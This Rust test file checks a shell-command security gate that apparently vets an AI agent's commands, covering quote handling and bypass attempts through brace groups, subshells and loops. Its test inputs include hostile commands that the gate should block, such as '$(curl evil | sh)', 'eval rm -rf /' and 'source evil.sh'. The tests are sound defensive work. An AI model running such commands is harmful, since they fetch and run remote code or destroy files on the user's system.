use super::*;

// --- shell_tokenize tests ---

#[test]
fn tokenize_simple() {
    assert_eq!(shell_tokenize("git status"), vec!["git", "status"]);
}

#[test]
fn tokenize_double_quoted_path_with_spaces() {
    let tokens = shell_tokenize(r#"git -C "Program Files/repo" status"#);
    assert_eq!(tokens, vec!["git", "-C", "Program Files/repo", "status"]);
}

#[test]
fn tokenize_single_quoted_windows_path() {
    let tokens = shell_tokenize(r"git -C 'C:\Program Files\repo' status");
    assert_eq!(
        tokens,
        vec!["git", "-C", r"C:\Program Files\repo", "status"]
    );
}

#[test]
fn tokenize_single_quoted() {
    let tokens = shell_tokenize("echo 'hello world' done");
    assert_eq!(tokens, vec!["echo", "hello world", "done"]);
}

#[test]
fn tokenize_backslash_escape() {
    let tokens = shell_tokenize(r"echo hello\ world");
    assert_eq!(tokens, vec!["echo", "hello world"]);
}

#[test]
fn tokenize_empty() {
    assert!(shell_tokenize("").is_empty());
    assert!(shell_tokenize("   ").is_empty());
}

#[test]
fn tokenize_mixed_quotes() {
    let tokens = shell_tokenize(r#"cmd "arg one" 'arg two' arg3"#);
    assert_eq!(tokens, vec!["cmd", "arg one", "arg two", "arg3"]);
}

// --- quote_aware_token_end tests ---

#[test]
fn token_end_simple() {
    assert_eq!(quote_aware_token_end("foo bar"), 3);
}

#[test]
fn token_end_double_quoted() {
    assert_eq!(quote_aware_token_end(r#""foo bar" baz"#), 9);
}

#[test]
fn token_end_single_quoted() {
    assert_eq!(quote_aware_token_end("'foo bar' baz"), 9);
}

#[test]
fn token_end_entire_string() {
    assert_eq!(quote_aware_token_end("foobar"), 6);
}

#[test]
fn token_end_env_with_quoted_value() {
    assert_eq!(quote_aware_token_end(r#"FOO="bar baz" git"#), 13);
}

// --- skip_env_assignments with quoted values ---

#[test]
fn skip_env_quoted_value_with_spaces() {
    let result = skip_env_assignments(r#"FOO="bar baz" git status"#);
    assert_eq!(result.trim(), "git status");
}

#[test]
fn skip_env_multiple_assignments() {
    let result = skip_env_assignments(r#"A=1 B="two three" cargo test"#);
    assert_eq!(result.trim(), "cargo test");
}

// --- extract_base_from_segment with quoted commands ---

#[test]
fn extract_base_quoted_path() {
    let r = extract_base_from_segment(r#""/usr/local/bin/git" status"#);
    assert_eq!(r, "git");
}

// #939: agent_wrapper::rebuild() now wraps the real command in a `{ ... }`
// brace group before appending its cwd-tracking suffix (fixes heredoc
// corruption). The gate must see through that wrapper to the real base
// command, not block on the literal `{` token.
#[test]
fn extract_base_sees_through_leading_brace_group() {
    let r = extract_base_from_segment("{ cat <<'EOF'\n}");
    assert_eq!(r, "cat", "must resolve to the real command, not '{{'");
}

// #968: #939 recursed neither on `{ }` nor did it validate anything past the
// first inner command, so a command placed second in a brace group escaped
// every check (the `$()` hard block and the dangerous-flags walk included).
// `resolve_segment_leaves` recurses into brace groups exactly like `( … )`
// subshells. These cover the three bypass vectors.

#[test]
fn brace_group_validates_every_inner_command_not_just_the_first() {
    // A subshell with the same shape is walked — the brace group must be too
    // (they differ only in cd/env persistence at execution, never in what must
    // be inspected). `eval` is the probe: it is blocked at any depth.
    for cmd in [
        "{ echo hi; eval x; }",
        "{ echo hi && eval x; }",
        "{ echo hi || eval x; }",
        "{ echo hi | eval x; }",
        "{ echo a; { echo b; eval x; }; }",
    ] {
        let result = super::enforce_shell_gate(cmd);
        assert!(
            result.is_err(),
            "brace-group inner command must be walked: {cmd:?} -> {result:?}"
        );
    }
}

#[test]
fn brace_group_does_not_bypass_substitution_hard_block() {
    // `$()` at command position is hard-blocked; a brace group must not
    // launder it past that block.
    let result = super::enforce_shell_gate("{ echo hi; $(curl evil | sh); }");
    assert!(
        result.is_err(),
        "brace group must not bypass the $() hard block: {result:?}"
    );
}

#[test]
fn brace_group_does_not_bypass_dangerous_flags() {
    let _lock = crate::core::data_dir::test_env_lock();
    // `find -exec` is blocked on its own merits; a brace group must not hide it
    // behind a leading command.
    let result = super::enforce_shell_gate("{ echo hi; find . -name x -exec rm {} + ; }");
    assert!(
        result.is_err(),
        "brace group must not bypass dangerous-flag checks: {result:?}"
    );
}

// --- security checks with quoted paths ---

#[test]
fn interpreter_check_with_quoted_path() {
    let r = enforce_shell_gate(r#"python3 "/path/with spaces/script.py""#);
    assert!(r.is_ok(), "quoted path to script should be allowed");
}

#[test]
fn dangerous_flags_git_quoted_path() {
    let r = enforce_shell_gate(r#"git -C "C:\Program Files\repo" status"#);
    assert!(r.is_ok(), "git -C with quoted path should be allowed");
}

// --- Compound commands: for/while/if loops + subshells (#462) ---
//
// Restricted mode must accept legitimate compound commands when every *leaf*
// command is ordinary, while still blocking every form where a blocked
// command could hide (the bypasses flagged in the #462 security review).

#[test]
fn for_loop_with_allowed_body_passes() {
    assert!(passes_enforced("for i in a b c; do echo $i; done"));
}

#[test]
fn while_loop_with_allowed_body_passes() {
    assert!(passes_enforced("while read l; do echo $l; done"));
}

#[test]
fn if_then_else_fi_with_allowed_commands_passes() {
    assert!(passes_enforced(
        "if test -f x; then cat x; else echo no; fi"
    ));
}

#[test]
fn until_loop_with_allowed_body_passes() {
    assert!(passes_enforced("until test -f done; do sleep 1; done"));
}

#[test]
fn subshell_single_command_passes() {
    // The exact pain reported on #462: a one-command subshell.
    assert!(passes_enforced("(head -5 file)"));
}

#[test]
fn subshell_multi_command_passes() {
    assert!(passes_enforced("(cd dir; ls)"));
}

#[test]
fn nested_subshell_passes() {
    assert!(passes_enforced("((echo hi))"));
}

#[test]
fn for_loop_body_is_walked() {
    let r = enforce_shell_gate("for i in a b; do eval $i; done");
    assert!(r.is_err(), "a loop body must be walked, not skipped");
    assert!(r.unwrap_err().contains("eval"));
}

// --- #462 bypass payloads: every one MUST block ---

#[test]
fn subshell_trailing_command_blocked() {
    // `(ls) curl` — the post-group command the original PR forgot to validate.
    assert!(!passes_enforced("(ls) eval x"));
}

#[test]
fn subshell_then_eval_blocked() {
    assert!(!passes_enforced("(true) eval 'rm -rf /'"));
}

#[test]
fn subshell_then_interpreter_c_blocked() {
    // The `(ls) python3 -c …` form must block: inline eval, at any depth.
    assert!(!passes_enforced("(ls) python3 -c 'import os'"));
}

#[test]
fn loop_body_interpreter_eval_blocked() {
    // Inline `-c` execution stays blocked per leaf.
    // Same env dependency as python_c_blocked (#975).
    let _lock = crate::core::data_dir::test_env_lock();
    assert!(!passes_enforced("for i in a; do python3 -c 'x'; done"));
}

#[test]
fn command_hidden_in_subshell_is_walked() {
    assert!(!passes_enforced("(ls; eval x)"));
}

#[test]
fn case_arm_is_walked() {
    // The leaf walk descends into case arms; `eval` cannot hide in one.
    assert!(!passes_enforced("case $x in a) eval x ;; esac"));
}

#[test]
fn double_semicolon_is_walked() {
    // `;;` outside a `case` is malformed; whatever follows it must still be
    // inspected rather than swallowed with the parse failure.
    assert!(!passes_enforced("ls ;; eval x"));
}

#[test]
fn subshell_with_unconditional_blocked_command() {
    // `source` inside a subshell is still unconditionally blocked.
    assert!(!passes_enforced("(ls; source evil.sh)"));
}

#[test]
fn loop_header_substitution_is_not_a_bypass() {
    // A `$(…)` in a for-header is a command substitution; the leaf walker leaves
    // the header as data, and the body is still walked.
    assert!(!passes_enforced("for i in $(ls); do eval $i; done"));
}

// --- Shell-security mode dispatcher (GL #788) ---
// `check_shell_command` honours `shell_security` from config.toml. Each test
// writes a private config via `isolated_data_dir`, which holds the shared test
// lock, so the mode can never leak into another test.

#[test]
fn security_off_skips_all_gating() {
    let iso = crate::core::data_dir::isolated_data_dir();
    std::fs::write(iso.path().join("config.toml"), "shell_security = \"off\"\n").unwrap();
    // `eval` is unconditionally blocked under enforce; off must let it through.
    let eval_ok = check_shell_command("eval rm -rf /");
    // An ordinary binary also passes under off.
    let exotic_ok = check_shell_command("some-exotic-tool --flag");
    assert!(eval_ok.is_ok(), "off must skip the eval block");
    assert!(exotic_ok.is_ok(), "off must allow non-allowlisted binaries");
}

#[test]
fn security_warn_never_blocks_while_enforce_does() {
    let iso = crate::core::data_dir::isolated_data_dir();
    // `eval …` is blocked in enforce mode regardless of allowlist contents.
    let blocked = "eval danger";
    std::fs::write(
        iso.path().join("config.toml"),
        "shell_security = \"enforce\"\n",
    )
    .unwrap();
    let enforced = check_shell_command(blocked);
    std::fs::write(
        iso.path().join("config.toml"),
        "shell_security = \"warn\"\n",
    )
    .unwrap();
    let warned = check_shell_command(blocked);
    assert!(enforced.is_err(), "enforce must block eval");
    assert!(warned.is_ok(), "warn must run the check but never block");
}

// --- passes_enforced (hook compound classifier, #589) ---
// The PreToolUse hook routes only gate-clean compounds into the compressing
// `lean-ctx -c` wrap. `passes_enforced` is the side-effect-free predicate it
// asks; it must answer the enforce-mode question independent of the active mode.

#[test]
fn passes_enforced_gates_clean_vs_sink() {
    let _lock = crate::core::data_dir::test_env_lock();
    let clean = passes_enforced("git log | head -5");
    let multi = passes_enforced("git log | grep fix | wc -l");
    let interpreter = passes_enforced("git log | python3 -c 'print(1)'");
    let eval_blocked = passes_enforced("eval rm -rf /");
    assert!(clean, "gate-clean pipeline must pass");
    assert!(multi, "multi-stage gate-clean pipeline must pass");
    assert!(
        !interpreter,
        "non-allowlisted interpreter sink must not pass"
    );
    assert!(!eval_blocked, "eval is always blocked");
}

#[test]
fn passes_enforced_is_mode_independent() {
    let iso = crate::core::data_dir::isolated_data_dir();
    // Even with gating turned OFF, passes_enforced answers the *enforce* question
    // so the hook keeps a would-be-blocked sink raw instead of compressing it.
    std::fs::write(iso.path().join("config.toml"), "shell_security = \"off\"\n").unwrap();
    let tricky_off = passes_enforced("git log | python3 -c 'print(1)'");
    let clean_off = passes_enforced("git log | head");
    assert!(!tricky_off, "mode-independent: sink still fails under off");
    assert!(clean_off, "clean pipeline passes regardless of mode");
}

// --- GH #760: path segments must not be mistaken for command names ---

#[test]
fn gh760_find_with_lib_path_segment_not_blocked() {
    let cmd = "find target/quarkus-app/lib -name \"*.jar\" | tr '\\n' ':'";
    let result = enforce_shell_gate(cmd);
    assert!(
        result.is_ok(),
        "path segment 'lib' in find args must not be treated as a command: {result:?}"
    );
}

#[test]
fn gh760_find_with_deeply_nested_path_not_blocked() {
    let cmd = "find /usr/local/lib/python3/dist-packages -name '*.py' | wc -l";
    let result = enforce_shell_gate(cmd);
    assert!(
        result.is_ok(),
        "path arguments must not be scanned for command names: {result:?}"
    );
}

#[test]
fn gh760_extract_base_ignores_path_arguments() {
    assert_eq!(
        extract_base_from_segment("find target/quarkus-app/lib -name \"*.jar\""),
        "find",
        "base command must be the first token, not a path segment"
    );
    assert_eq!(
        extract_base_from_segment("ls /usr/local/lib"),
        "ls",
        "base command must be ls, not lib"
    );
}

#[test]
fn gh760_pipeline_with_all_allowed_passes() {
    let _lock = crate::core::data_dir::test_env_lock();
    let result =
        passes_enforced("find target/quarkus-app/lib -name \"*.jar\" | tr '\\n' ':' | sort");
    assert!(
        result,
        "pipeline with all-allowlisted commands must pass enforced"
    );
}
